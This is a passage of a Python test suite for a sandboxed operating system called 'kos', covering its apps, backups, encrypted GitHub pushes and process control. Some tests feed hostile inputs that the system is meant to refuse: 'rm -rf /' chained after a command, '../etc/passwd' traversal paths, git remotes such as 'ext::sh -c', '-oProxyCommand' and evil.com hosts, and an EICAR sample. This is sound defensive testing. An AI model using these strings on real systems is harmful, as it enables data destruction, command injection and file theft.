        self.assertTrue(PermitStore(self.paths).is_permitted("hello"))
        self.assertTrue(self.ask({"action": "revoke", "app": "hello"}, PW)["ok"])
        self.assertFalse(PermitStore(self.paths).is_permitted("hello"))

    def test_line_runs_the_line_shell_inside_the_desktop(self):
        lines = lambda text, *a: self.ask({"action": "line", "text": text}, *a)["lines"]
        self.assertTrue(any("hello" in l and "needs: permit" in l for l in lines("lista")))
        self.assertEqual(lines("permite hello", PW), ["hello may now run"])
        self.assertTrue(any("hello" in l and "permitted" in l for l in lines("list")))
        self.assertIn("nothing is owed", lines("owed")[0])
        self.assertTrue(any("Landlock" in l for l in lines("doctor")))
        self.assertTrue(any("don't know" in l for l in lines("bonjour")))
        self.assertTrue(any("real terminal" in l for l in lines("write a.txt hi")))
        self.assertTrue(any("real terminal" in l for l in lines("run hello")))

    def test_line_runs_code_as_a_sandboxed_command_and_shell_glue_runs_nothing(self):
        out = self.ask({"action": "line", "text": "print(6 * 7)"}, PW)["lines"]
        self.assertIn("42", out)
        out = self.ask({"action": "line", "text": "run hello; rm -rf /"})["lines"]
        self.assertTrue(any("no shell compiler or interpreter wired in" in l for l in out))


class TestSystemAppsRunForReal(DesktopSessionEnv):
    """Each built-in app, as a real sandboxed process, against scripted input."""

    def go(self, name, push_after=2.5, keys=(), wait=6.0):
        s = self.start(SYSTEM_DIR / name, name, bridge=SystemBridge(self.paths))
        self.boot_both()
        if keys:
            threading.Timer(push_after, lambda: self.devices.push(*keys)).start()
        threading.Timer(wait, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        return self.output()

    def test_security_center_shows_the_admin_keyboard_kernel_and_owed(self):
        out = self.go("security")
        for needle in ("Security Center", "Administrator keyboard", "OFF", "Kernel protections",
                       "Landlock ABI", "nothing is owed", "Recent decisions"):
            self.assertIn(needle, out)

    def test_protections_lists_apps_and_toggles_permission_with_a_password(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        s = self.start(SYSTEM_DIR / "protections", "protections", bridge=SystemBridge(self.paths),
                       authority=Authority(self.paths, None, Throttle(self.paths, base=0)))
        self.boot_both()
        threading.Timer(3.0, lambda: self.devices.push(ENTER)).start()      # first app = hello
        self.when_modal("Password to give app permission", [*_keys(PW), ENTER])
        threading.Timer(9.0, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        out = self.output()
        self.assertIn("Kernel protections", out)
        self.assertIn("NOT permitted", out)
        self.assertTrue(PermitStore(self.paths).is_permitted("hello"))

    def test_the_settings_hub_opens_only_apps_that_exist_and_holds_no_power_of_its_own(self):
        import re
        from kos.desktop import SYSTEM_APPS
        m = Manifest.parse((SYSTEM_DIR / "settings" / "manifest.json").read_bytes())
        self.assertEqual((m.modes, set(m.permissions), set(m.scopes)), (("graphical",), {"shell", "system:apps"}, {"apps"}))   # change the look, open an app, nothing more
        code = (SYSTEM_DIR / "settings" / "app.js").read_text()
        ids = re.findall(r"\['([a-z-]+)', '[^']+', '[^']+'\]", code)
        self.assertGreaterEqual(len(ids), 15)
        for app_id in ids:
            self.assertIn(app_id, SYSTEM_APPS, app_id)                                  # every card opens a real built-in app
            self.assertTrue((SYSTEM_DIR / app_id / "manifest.json").exists(), app_id)
        self.assertTrue((SYSTEM_DIR / "protections" / "manifest.json").exists())          # the old kernel-protections page kept its place under its own name

    def test_files_browses_the_filesystem_by_asking_the_os(self):
        out = self.go("files")
        self.assertIn("Files", out)
        self.assertIn("etc/", out)

    def test_terminal_runs_a_plain_language_line(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        out = self.go("terminal", keys=[*_keys("lista"), ENTER])
        self.assertIn("kos> lista", out)
        self.assertIn("needs: permit", out)

    def test_terminal_runs_a_code_line_in_the_sandbox_after_the_prompt(self):
        s = self.start(SYSTEM_DIR / "terminal", "terminal", bridge=SystemBridge(self.paths),
                       authority=Authority(self.paths, None, Throttle(self.paths, base=0)))
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push(*_keys("print(6*7)"), ENTER)).start()
        self.when_modal("Password to run code", [*_keys(PW), ENTER])
        threading.Timer(9.0, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        out = self.output()
        self.assertIn("kos> print(6*7)", out)
        self.assertRegex(out, r"\b42\b")


from kos import backup as kbackup  # noqa: E402


class TestFileRequestsProtocol(unittest.TestCase):
    def test_valid_file_requests(self):
        v = lambda **m: validate_app_message({"cmd": "request", **m}, "tui")
        self.assertEqual(v(action="save", path="/tmp/a", text="line1\nline2\n\tindented")["action"], "save")
        self.assertEqual(v(action="backup", path="/tmp/docs")["path"], "/tmp/docs")
        self.assertEqual(v(action="backups")["action"], "backups")
        self.assertEqual(v(action="restore", backup="docs-20260101-000000.zip",
                           member="docs/a.txt", to="/tmp/a.txt")["member"], "docs/a.txt")

    def test_hostile_file_requests_are_rejected(self):
        v = lambda **m: validate_app_message({"cmd": "request", **m}, "tui")
        for bad in (dict(action="save", path="/tmp/a", text="x\x1b[2Jy"), dict(action="save", path="/tmp/a", text="x\x00y"),
                    dict(action="save", path="/tmp/a", text="x" * (300 << 10)), dict(action="save", path="", text="x"),
                    dict(action="save", path="/tmp/a", text=5),
                    dict(action="restore", backup="../etc/passwd", member="a", to="/tmp/a"),
                    dict(action="restore", backup="x.zip", member="", to="/tmp/a"),
                    dict(action="backup", path="a\x00b")):
            with self.assertRaises(ProtocolError, msg=bad):
                v(**bad)


class TestBackup(AdminEnv):
    def setUp(self):
        super().setUp()
        self.docs = Path(self.tmp.name) / "docs"
        (self.docs / "sub").mkdir(parents=True)
        (self.docs / "a.txt").write_text("alpha")
        (self.docs / "sub" / "b.txt").write_text("beta")
        (self.docs / "link").symlink_to("/etc/hostname")

    def test_backup_of_a_folder_is_a_zip_that_is_never_extracted(self):
        info = kbackup.create(self.paths, self.authority(PW), str(self.docs))
        self.assertEqual(info["files"], 2)                         # the symlink was skipped
        self.assertRegex(info["name"], r"^docs-\d{8}-\d{6}\.zip$")
        z = zipfile.ZipFile(info["path"])
        self.assertEqual(sorted(z.namelist()), ["docs/a.txt", "docs/sub/b.txt"])
        self.assertEqual([b["name"] for b in kbackup.list_backups(self.paths)], [info["name"]])
        self.assertEqual(oct(Path(info["path"]).stat().st_mode & 0o777), "0o600")
        self.assertEqual(Ledger_owed(self.paths), [])               # the scan it owed was done

    def test_it_needs_the_password(self):
        with self.assertRaises(AuthorizationDenied):
            kbackup.create(self.paths, self.authority("no", "no", "no"), str(self.docs))
        self.assertEqual(kbackup.list_backups(self.paths), [])

    def test_a_flagged_document_is_quarantined_not_kept(self):
        (self.docs / "virus.txt").write_bytes(EICAR)
        with self.assertRaises(WriteBlocked):
            kbackup.create(self.paths, self.authority(PW), str(self.docs))
        self.assertEqual(kbackup.list_backups(self.paths), [])
        self.assertEqual(len(list((self.paths.state / "quarantine").glob("write-*.zip"))), 1)
        self.assertEqual(Ledger_owed(self.paths), [])

    def test_kos_state_and_missing_paths_are_refused(self):
        self.paths.ensure()
        for bad in (str(self.paths.state), str(self.paths.etc), str(self.docs / "nope")):
            with self.assertRaises(AdminError):
                kbackup.create(self.paths, self.authority(PW), bad)

    def test_restore_reads_only_real_members_of_real_backups(self):
        info = kbackup.create(self.paths, self.authority(PW), str(self.docs))
        self.assertEqual(kbackup.read_member(self.paths, info["name"], "docs/a.txt"), b"alpha")
        for backup, member in ((info["name"], "../../etc/passwd"), (info["name"], "/etc/passwd"),
                               (info["name"], "docs/missing"), ("../x.zip", "docs/a.txt"),
                               ("nope.zip", "docs/a.txt")):
            with self.assertRaises(AdminError, msg=(backup, member)):
                kbackup.read_member(self.paths, backup, member)


def Ledger_owed(paths):
    from kos.requires import Ledger
    return Ledger(paths).owed()


class TestEditorBackupBridge(AdminEnv):
    def setUp(self):
        super().setUp()
        self.sent = []
        self.work = Path(self.tmp.name) / "work"
        self.work.mkdir()
        self.kb_ = self.booted()

    def ask(self, req, *answers):
        with mock.patch("kos.system.AdminKeyboard", lambda paths: self.kb_):
            SystemBridge(self.paths).handle({"cmd": "request", **req}, self.sent.append,
                                            self.authority(*answers))
        return self.sent[-1]

    def test_view_marks_files_that_would_not_round_trip_as_lossy(self):
        plain, tabbed, crlf, longline = (self.work / n for n in ("p", "t", "c", "l"))
        plain.write_text("one\ntwo\n")
        tabbed.write_text("a\tb\n")
        crlf.write_bytes(b"a\r\nb\r\n")
        longline.write_text("x" * 500 + "\n")
        for f, lossy in ((plain, False), (tabbed, True), (crlf, True), (longline, True)):
            r = self.ask({"action": "view", "path": str(f)}, PW)
            self.assertEqual(r["lossy"], lossy, f.name)

    def test_save_is_a_guarded_write_and_keeps_the_file_mode(self):
        f = self.work / "n.txt"
        f.write_text("old\n")
        os.chmod(f, 0o640)
        r = self.ask({"action": "save", "path": str(f), "text": "new\nlines\n"}, PW)
        self.assertEqual(r["cmd"], "text")
        self.assertEqual(f.read_text(), "new\nlines\n")
        self.assertEqual(oct(f.stat().st_mode & 0o777), "0o640")
        self.assertTrue(any("security scan: clean" in l for l in r["lines"]))
        self.assertEqual(Ledger_owed(self.paths), [])

    def test_save_needs_the_admin_keyboard_the_password_and_a_clean_scan(self):
        f = self.work / "n.txt"
        r = self.ask({"action": "save", "path": str(f), "text": "x\n"}, "no", "no", "no")
        self.assertFalse(r["ok"])
        self.assertFalse(f.exists())
        r = self.ask({"action": "save", "path": str(f), "text": EICAR.decode() + "\n"}, PW)
        self.assertFalse(r["ok"])
        self.assertIn("security scan", r["detail"])
        self.assertFalse(f.exists())                                  # quarantined afterwards
        self.kb_.shutdown()
        r = self.ask({"action": "save", "path": str(f), "text": "x\n"})   # refused before any prompt
        self.assertFalse(r["ok"])
        self.assertIn("not booted", r["detail"])

    def test_backup_list_and_restore_go_through_the_guarded_write(self):
        docs = self.work / "docs"
        docs.mkdir()
        (docs / "a.txt").write_text("alpha")
        r = self.ask({"action": "backup", "path": str(docs)}, PW)
        self.assertIn("backed up 1 file(s)", r["lines"][0])
        name = self.ask({"action": "backups"})["backups"][0]["name"]
        dest = self.work / "restored.txt"
        r = self.ask({"action": "restore", "backup": name, "member": "docs/a.txt", "to": str(dest)}, PW)
        self.assertEqual(dest.read_text(), "alpha")
        self.assertEqual(r["lines"][0], "restored docs/a.txt")
        self.kb_.shutdown()                                           # no admin keyboard -> no restore
        r = self.ask({"action": "restore", "backup": name, "member": "docs/a.txt",
                      "to": str(self.work / "again.txt")})
        self.assertFalse(r["ok"])
        self.assertFalse((self.work / "again.txt").exists())

    def test_line_shell_backs_up_in_plain_language(self):
        docs = self.work / "d"
        docs.mkdir()
        (docs / "a.txt").write_text("a")
        out = self.ask({"action": "line", "text": f"respalda {docs}"}, PW)["lines"]
        self.assertIn("backed up 1 file(s)", out[0])


class TestEditorAndBackupAppsRunForReal(DesktopSessionEnv):
    def admin(self):
        kb = AdminKeyboard(self.paths, kernel_report=lambda: dict(GOOD_KERNEL),
                           probe=lambda: ["/dev/input/event0"], boot_id=lambda: "boot-1")
        with self.authority(PW).authorize("session.login") as g:
            kb.boot(g)
        return kb

    def test_editor_opens_edits_and_saves_through_the_guarded_write(self):
        f = Path(self.tmp.name) / "note.txt"
        f.write_text("hello\n")
        kb = self.admin()
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        with mock.patch("kos.system.AdminKeyboard", lambda paths: kb):
            s = self.start(SYSTEM_DIR / "editor", "editor", bridge=SystemBridge(self.paths), authority=auth)
            self.boot_both()
            threading.Timer(2.5, lambda: self.devices.push(*_keys(str(f)), ENTER)).start()
            self.when_modal("Password to view file", [*_keys(PW), ENTER])
            threading.Timer(7.0, lambda: self.devices.push(*_keys("X"),
                                                          {"type": "key", "key": "ctrl-s"})).start()
            self.when_modal("Password to write file", [*_keys(PW), ENTER])
            threading.Timer(15.0, lambda: self.devices.push({"type": "interrupt"})).start()
            s.run(first_frame_timeout=1.0)
        self.assertEqual(f.read_text(), "Xhello\n")                  # typed X at the start, saved
        self.assertIn("saved.", self.output())
        self.assertEqual(Ledger_owed(self.paths), [])               # scan + optimize were done

    def test_editor_opens_a_lossy_file_read_only_and_never_saves_it(self):
        f = Path(self.tmp.name) / "tabbed.txt"
        f.write_text("a\tb\n")
        kb = self.admin()
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        with mock.patch("kos.system.AdminKeyboard", lambda paths: kb):
            s = self.start(SYSTEM_DIR / "editor", "editor", bridge=SystemBridge(self.paths), authority=auth)
            self.boot_both()
            threading.Timer(2.5, lambda: self.devices.push(*_keys(str(f)), ENTER)).start()
            self.when_modal("Password to view file", [*_keys(PW), ENTER])
            threading.Timer(7.0, lambda: self.devices.push(*_keys("X"),
                                                          {"type": "key", "key": "ctrl-s"})).start()
            threading.Timer(10.0, lambda: self.devices.push({"type": "interrupt"})).start()
            s.run(first_frame_timeout=1.0)
        self.assertIn("READ-ONLY", self.output())
        self.assertEqual(f.read_text(), "a\tb\n")                    # untouched

    def test_backup_app_backs_a_folder_up_after_the_password(self):
        docs = Path(self.tmp.name) / "mydocs"
        docs.mkdir()
        (docs / "a.txt").write_text("alpha")
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        s = self.start(SYSTEM_DIR / "backup", "backup", bridge=SystemBridge(self.paths), authority=auth)
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push(*_keys("n" + str(docs)), ENTER)).start()
        self.when_modal("Password to back up files", [*_keys(PW), ENTER])
        threading.Timer(9.0, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        backups = kbackup.list_backups(self.paths)
        self.assertEqual(len(backups), 1)
        self.assertIn("backed up 1 file(s)", self.output())
        self.assertIn(backups[0]["name"], self.output())


import subprocess as _sp  # noqa: E402
from kos.offsite import GITHUB_RE, Offsite, OffsiteError  # noqa: E402


class TestOffsite(AdminEnv):
    def setUp(self):
        super().setUp()
        docs = Path(self.tmp.name) / "docs"
        docs.mkdir()
        (docs / "a.txt").write_text("alpha")
        self.info = kbackup.create(self.paths, self.authority(PW), str(docs))
        self.bare = Path(self.tmp.name) / "remote.git"
        _sp.run(["git", "init", "-q", "--bare", "-b", "main", str(self.bare)], check=True)
        self.public = [False]
        self.off = Offsite(self.paths, public_check=lambda url: self.public[0], allow_any_remote=True)
        self.off.set_remote(self.authority(PW), f"file://{self.bare}")

    def remote_has(self, name):
        r = _sp.run(["git", "--git-dir", str(self.bare), "ls-tree", "-r", "--name-only", "main"],
                    capture_output=True, text=True)
        return name in r.stdout.split()

    def test_push_sends_the_backup_to_a_private_repository_after_the_password(self):
        msg = self.off.push(self.authority(PW), self.info["name"])
        self.assertIn(self.info["name"], msg)
        sealed = self.info["name"] + ".kenc"
        self.assertTrue(self.remote_has(sealed))
        self.assertFalse(self.remote_has(self.info["name"]))           # the plain backup never leaves
        blob = _sp.run(["git", "--git-dir", str(self.bare), "show", f"main:{sealed}"], capture_output=True).stdout
        plain = Path(self.info["path"]).read_bytes()
        self.assertTrue(blob.startswith(b"KOSENC1\n"))
        self.assertNotIn(b"alpha", blob)
        self.assertNotIn(plain[:30], blob)                               # not even the zip header shows
        out = Path(self.tmp.name) / "opened.zip"
        enc = Path(self.tmp.name) / "got.kenc"
        enc.write_bytes(blob)
        self.off.decrypt(self.authority(PW), enc, out)
        self.assertEqual(out.read_bytes(), plain)                        # and it opens with the password
        from kos import vault
        with self.assertRaises(vault.VaultError) as ctx:                  # e.g. sealed under an older password
            vault.decrypt_file(enc, Path(self.tmp.name) / "no.zip", b"x" * 32)
        self.assertIn("wrong password", str(ctx.exception))
        self.assertFalse((Path(self.tmp.name) / "no.zip").exists())
        self.off.push(self.authority(PW), self.info["name"])           # pushing again is fine

    def test_encryption_detects_tampering_truncation_and_reordering(self):
        from kos import vault
        key = b"k" * 32
        src, enc, out = (Path(self.tmp.name) / n for n in ("p.bin", "p.kenc", "p.out"))
        src.write_bytes(os.urandom(vault.CHUNK * 2 + 123))              # three chunks
        vault.encrypt_file(src, enc, key)
        vault.decrypt_file(enc, out, key)
        self.assertEqual(out.read_bytes(), src.read_bytes())
        data = enc.read_bytes()
        cases = {"flip": data[:100] + bytes([data[100] ^ 1]) + data[101:], "cut": data[:-50],
                 "dropped last chunk": data[:len(vault.MAGIC) + 24 + 4 + vault.CHUNK + 16 + 4 + vault.CHUNK + 16],
                 "empty": b"", "other": b"hello"}
        for name, bad in cases.items():
            enc.write_bytes(bad)
            with self.assertRaises(vault.VaultError, msg=name):
                vault.decrypt_file(enc, out, key)
        enc.write_bytes(data)
        with self.assertRaises(vault.VaultError):
            vault.decrypt_file(enc, out, b"x" * 32)
        vault.encrypt_file(src, Path(self.tmp.name) / "p2.kenc", key)     # fresh salt/nonce each time
        self.assertNotEqual((Path(self.tmp.name) / "p2.kenc").read_bytes()[:40], data[:40])

    def test_a_publicly_readable_repository_is_refused_before_any_password(self):
        self.public[0] = True
        with self.assertRaises(OffsiteError) as ctx:
            self.off.push(self.authority(), self.info["name"])         # no answers: no prompt
        self.assertIn("publicly readable", str(ctx.exception))
        self.assertFalse(self.remote_has(self.info["name"]))

    def test_repository_that_turns_public_during_the_prompt_is_still_refused(self):
        answers = iter([False, True])
        off = Offsite(self.paths, public_check=lambda url: next(answers), allow_any_remote=True)
        with self.assertRaises(OffsiteError):
            off.push(self.authority(PW), self.info["name"])
        self.assertFalse(self.remote_has(self.info["name"]))

    def test_needs_a_remote_the_password_and_a_real_backup_name(self):
        none = Offsite(Paths(Path(self.tmp.name) / "empty"), public_check=lambda u: False)
        with self.assertRaises(OffsiteError):
            none.push(self.authority(), "x.zip")
        with self.assertRaises(AuthorizationDenied):
            self.off.push(self.authority("no", "no", "no"), self.info["name"])
        for bad in ("../x.zip", "nope.zip", "a/b.zip", "x"):
            with self.assertRaises(OffsiteError, msg=bad):
                self.off.push(self.authority(PW), bad)
        self.assertFalse(self.remote_has(self.info["name"]))

    def test_only_github_repositories_can_be_the_destination(self):
        strict = Offsite(self.paths)
        for bad in ("https://evil.com/a/b", "http://github.com/a/b", "ext::sh -c touch /tmp/pwn",
                    "file:///tmp/x", "https://github.com/a", "https://github.com/a/b/c",
                    "git@evil.com:a/b.git", "-oProxyCommand=x"):
            with self.assertRaises(OffsiteError, msg=bad):
                strict.set_remote(self.authority(PW), bad)
        for good in ("https://github.com/me/docs-backup", "git@github.com:me/docs.git",
                     "https://github.com/me/docs.git"):
            self.assertTrue(GITHUB_RE.match(good), good)

    def test_the_anonymous_probe_cannot_use_any_credentials(self):
        calls = []

        def runner(cmd, **kw):
            calls.append((cmd, kw))
            return _sp.CompletedProcess(cmd, kw.pop("_rc", 128), b"", b"")

        strict = Offsite(self.paths, runner=runner)
        self.assertFalse(strict.is_public("git@github.com:me/docs.git"))   # auth needed -> private
        cmd, kw = calls[-1]
        self.assertEqual(cmd[-1], "https://github.com/me/docs.git")        # ssh url probed anonymously
        self.assertEqual(kw["env"]["GIT_TERMINAL_PROMPT"], "0")
        self.assertEqual(kw["env"]["GIT_CONFIG_GLOBAL"], os.devnull)
        self.assertEqual(kw["env"]["GIT_ASKPASS"], "/bin/true")
        self.assertEqual(kw["stdin"], _sp.DEVNULL)
        ok = Offsite(self.paths, runner=lambda cmd, **kw: _sp.CompletedProcess(cmd, 0, b"", b""))
        self.assertTrue(ok.is_public("https://github.com/me/docs"))        # readable anonymously -> public

    def test_the_backup_app_can_push_via_the_bridge(self):
        sent = []
        with mock.patch("kos.offsite.Offsite", lambda paths: self.off):
            SystemBridge(self.paths).handle(
                {"cmd": "request", "action": "push", "backup": self.info["name"]},
                sent.append, self.authority(PW))
        self.assertEqual(sent[-1]["cmd"], "text")
        self.assertTrue(self.remote_has(self.info["name"] + ".kenc"))
        self.public[0] = True
        with mock.patch("kos.offsite.Offsite", lambda paths: self.off):
            SystemBridge(self.paths).handle(
                {"cmd": "request", "action": "push", "backup": self.info["name"]},
                sent.append, self.authority())
        self.assertFalse(sent[-1]["ok"])
        self.assertIn("publicly readable", sent[-1]["detail"])


class TestEachUserUsesTheirOwnGitHub(AdminEnv):
    """The OS is for many people: nobody's backups go to anyone else's GitHub."""

    def ask(self, req, *answers):
        sent = []
        SystemBridge(self.paths).handle({"cmd": "request", **req}, sent.append, self.authority(*answers))
        return sent[-1]

    def test_the_destination_is_whatever_this_user_set_and_defaults_to_nothing(self):
        self.assertEqual(self.ask({"action": "backups"})["remote"], "")
        r = self.ask({"action": "remote", "url": "https://github.com/some-user/their-docs"}, PW)
        self.assertTrue(r["ok"])
        self.assertEqual(self.ask({"action": "backups"})["remote"], "https://github.com/some-user/their-docs")
        # another person's machine (a separate KOS root) knows nothing of it
        with tempfile.TemporaryDirectory() as other:
            self.assertIsNone(Offsite(Paths(Path(other))).remote())

    def test_setting_it_needs_the_password_and_refuses_anything_but_github(self):
        r = self.ask({"action": "remote", "url": "https://github.com/me/docs"}, "no", "no", "no")
        self.assertFalse(r["ok"])
        self.assertEqual(self.ask({"action": "backups"})["remote"], "")
        r = self.ask({"action": "remote", "url": "https://evil.com/me/docs"}, PW)
        self.assertFalse(r["ok"])
        self.assertIn("GitHub repository", r["detail"])

    def test_no_account_is_baked_into_the_code(self):
        root = Path(__file__).resolve().parent.parent
        for f in list((root / "kos").glob("*.py")) + list((root / "examples").rglob("*.py")):
            self.assertNotIn("zach909", f.read_text(), f.name)


class TestCellsRefuseNpmApps(Env):
    def test_an_npm_app_is_refused_inside_a_cell_with_a_clear_reason(self):
        from kos.cellagent import handle
        a, b = socket.socketpair()
        send_app(a, KApp(self.kapp.read_bytes()), "tui")           # hello is an npm app now
        with self.assertRaises(ValueError) as ctx:
            handle(b, SandboxPolicy())
        self.assertIn("no Node.js inside a cell", str(ctx.exception))
        a.close()
        b.close()


# ---------------------------------------------------------------------------
# The core OS services: facts (osinfo), control (proctl, fschange), and the apps
# ---------------------------------------------------------------------------
import subprocess as _subp  # noqa: E402
from kos import osinfo  # noqa: E402
from kos.fschange import FsChangeError, change as fs_change, empty_old_trash  # noqa: E402
from kos.proctl import ProcessError, renice, signal_process  # noqa: E402


class TestServiceRequestsProtocol(unittest.TestCase):
    def v(self, **m):
        return validate_app_message({"cmd": "request", **m}, "tui")

    def test_valid_requests(self):
        for kind in osinfo.KINDS:
            self.assertEqual(self.v(action="sys", kind=kind)["kind"], kind)
        self.assertEqual(self.v(action="sys", kind="stat", arg="/etc")["arg"], "/etc")
        self.assertEqual(self.v(action="signal", pid=1234, sig="TERM")["sig"], "TERM")
        self.assertEqual(self.v(action="renice", pid=1234, nice=5)["nice"], 5)
        self.assertEqual(self.v(action="fschange", op="chmod", path="/tmp/x", mode="644")["mode"], "644")
        self.assertEqual(self.v(action="fschange", op="rename", path="/tmp/a", to="/tmp/b")["to"], "/tmp/b")
        self.assertEqual(self.v(action="netcheck")["action"], "netcheck")

    def test_hostile_requests_are_rejected(self):
        for bad in (dict(action="sys", kind="shadow"), dict(action="sys", kind="stat", arg="a\x00"),
                    dict(action="signal", pid=1, sig="TERM"), dict(action="signal", pid=True, sig="TERM"),
                    dict(action="signal", pid=99, sig="SEGV"), dict(action="signal", pid="99", sig="TERM"),
                    dict(action="renice", pid=99, nice=-5), dict(action="renice", pid=99, nice=20),
                    dict(action="fschange", op="rm", path="/tmp/x"),
                    dict(action="fschange", op="chmod", path="/tmp/x", mode="4755x"),
                    dict(action="fschange", op="chmod", path="/tmp/x", mode="rwx"),
                    dict(action="fschange", op="rename", path="/tmp/x")):
            with self.assertRaises(ProtocolError, msg=bad):
                self.v(**bad)


class TestOsInfoParsers(unittest.TestCase):
    """The parsers, against a fake /proc (so they are exact on any machine)."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.proc = Path(self.tmp.name)
        self.addCleanup(self.tmp.cleanup)

    def put(self, rel, text):
        f = self.proc / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text)

    def test_memory(self):
        self.put("meminfo", "MemTotal: 1000 kB\nMemFree: 100 kB\nMemAvailable: 600 kB\nCached: 300 kB\n"
                            "SwapTotal: 200 kB\nSwapFree: 150 kB\nDirty: 4 kB\n")
        self.put("vmstat", "pgfault 77\npswpout 5\nunrelated 1\noom_kill 2\n")
        self.put("swaps", "Filename Type Size Used Priority\n/swapfile file 200 50 -2\n")
        self.put("pressure/memory", "some avg10=1.50 avg60=0.00 avg300=0.00 total=1\nfull avg10=0.00\n")
        self.put("sys/vm/swappiness", "60\n")
        m = osinfo.memory(str(self.proc))
        self.assertEqual((m["kb"]["MemTotal"], m["kb"]["MemAvailable"], m["kb"]["SwapFree"]), (1000, 600, 150))
        self.assertEqual(m["vm"], {"pgfault": 77, "pswpout": 5, "oom_kill": 2})
        self.assertEqual(m["swaps"], [{"file": "/swapfile", "type": "file", "size_kb": 200, "used_kb": 50}])
        self.assertEqual(m["pressure"]["memory"]["avg10"], "1.50")
        self.assertEqual(m["swappiness"], 60)

    def test_processes_even_with_awkward_names(self):
        self.put("loadavg", "0.50 0.25 0.10 2/100 999\n")
        self.put("uptime", "1234.5 99.0\n")
        self.put("42/stat", "42 (my (weird) app) S 1 42 42 0 -1 0 0 0 0 0 150 50 0 0 20 5 3 0 777 "
                            "1000000 25 0 0\n")
        self.put("42/status", "Name:\tmy\nUid:\t1000\t1000\t1000\t1000\nVmRSS:\t2048 kB\n"
                              "voluntary_ctxt_switches:\t10\nnonvoluntary_ctxt_switches:\t3\n")
        self.put("42/cmdline", "/usr/bin/my\x00--flag\x00")
        p = osinfo.processes(str(self.proc))
        self.assertEqual(p["load"], [0.5, 0.25, 0.1])
        r = p["processes"][0]
        self.assertEqual((r["pid"], r["name"], r["state"], r["ppid"]), (42, "my (weird) app", "S", 1))
        self.assertEqual((r["cpu_ticks"], r["nice"], r["priority"], r["threads"]), (200, 5, 20, 3))
        self.assertEqual((r["rss_kb"], r["vol_switches"], r["invol_switches"]), (2048, 10, 3))
        self.assertEqual(r["cmd"], "/usr/bin/my --flag")

    def test_network_and_connection_decoding(self):
        self.put("net/dev", "Inter-| Receive | Transmit\n face |bytes packets errs drop fifo frame compressed multicast"
                            "|bytes packets errs drop fifo colls carrier compressed\n"
                            "  eth0: 1000 10 1 2 0 0 0 0 2000 20 3 4 0 0 0 0\n")
        self.put("net/route", "Iface Destination Gateway Flags\neth0 00000000 0100A8C0 0003\n")
        self.put("net/tcp", "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
                            "   0: 0100007F:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000 0 12345 1\n")
        self.put("net/unix", "Num RefCount Protocol Flags Type St Inode Path\n"
                             "0000: 00000002 00000000 00010000 0001 01 111 /run/x.sock\n")
        self.put("net/snmp", "Ip: InReceives OutRequests\nIp: 5 6\nTcp: CurrEstab ActiveOpens\nTcp: 2 3\n")
        n = osinfo.network(str(self.proc), str(self.proc / "sys"))
        eth = n["interfaces"][0]
        self.assertEqual((eth["name"], eth["rx_bytes"], eth["rx_errors"], eth["tx_drop"]), ("eth0", 1000, 1, 4))
        self.assertEqual(n["gateway"], "192.168.0.1 via eth0")
        c = n["connections"][0]
        self.assertEqual((c["local"], c["state"], c["uid"], c["inode"]), ("127.0.0.1:80", "LISTEN", 1000, 12345))
        self.assertEqual(n["unix"][0]["path"], "/run/x.sock")
        self.assertEqual(n["protocols"]["Tcp"]["CurrEstab"], 2)
        self.assertEqual(osinfo._addr("00000000000000000000000001000000:0050"), "::1:80")

    def test_permissions_are_described_exactly(self):
        with tempfile.TemporaryDirectory() as d:
            f = Path(d) / "prog"
            f.write_text("x")
            os.chmod(f, 0o4755)
            s = osinfo.stat_path(str(f))
            self.assertEqual((s["mode"], s["octal"], s["setuid"]), ("-rwsr-xr-x", "4755", True))
            os.chmod(f, 0o640)
            s = osinfo.stat_path(str(f))
            self.assertEqual((s["mode"], s["setuid"]), ("-rw-r-----", False))
            self.assertEqual(osinfo._mode_string(0o41777), "drwxrwxrwt")

    def test_real_system_smoke(self):
        for kind in ("processes", "memory", "mounts", "devices", "network", "health", "resources", "isolation"):
            with tempfile.TemporaryDirectory() as d:
                data = osinfo.KINDS[kind](Paths(Path(d)), "")
                json.dumps(data)                                   # everything is plain JSON
        p = osinfo.processes()
        self.assertTrue(any(r["pid"] == os.getpid() for r in p["processes"]))
        self.assertGreater(osinfo.memory()["kb"]["MemTotal"], 0)


class TestProcessControl(Env):
    def spawn(self):
        proc = _subp.Popen(["sleep", "60"])
        self.addCleanup(lambda: (proc.kill(), proc.wait()))
        return proc

    def test_terminate_needs_the_password_and_works(self):
        proc = self.spawn()
        with self.assertRaises(AuthorizationDenied):
            signal_process(self.authority("no", "no", "no"), proc.pid, "TERM")
        self.assertIsNone(proc.poll())
        self.assertIn("sent TERM", signal_process(self.authority(PW), proc.pid, "TERM"))
        self.assertEqual(proc.wait(5), -15)

    def test_pause_and_resume(self):
        proc = self.spawn()
        signal_process(self.authority(PW), proc.pid, "STOP")
        _time.sleep(0.2)
        self.assertIn("T", osinfo._read(f"/proc/{proc.pid}/stat").rpartition(")")[2].split()[0])
        signal_process(self.authority(PW), proc.pid, "CONT")

    def test_the_guards_hold(self):
        auth = lambda: self.authority()                           # no answers: must refuse before asking
        for pid in (1, os.getpid(), os.getppid(), 4194300):
            with self.assertRaises(ProcessError, msg=pid):
                signal_process(auth(), pid, "KILL")
        with self.assertRaises(ProcessError):
            signal_process(auth(), self.spawn().pid, "SEGV")
        with self.assertRaises(ProcessError):
            renice(auth(), self.spawn().pid, 40)

    def test_renice_raises_the_nice_value(self):
        proc = self.spawn()
        renice(self.authority(PW), proc.pid, 7)
        self.assertEqual(os.getpriority(os.PRIO_PROCESS, proc.pid), 7)


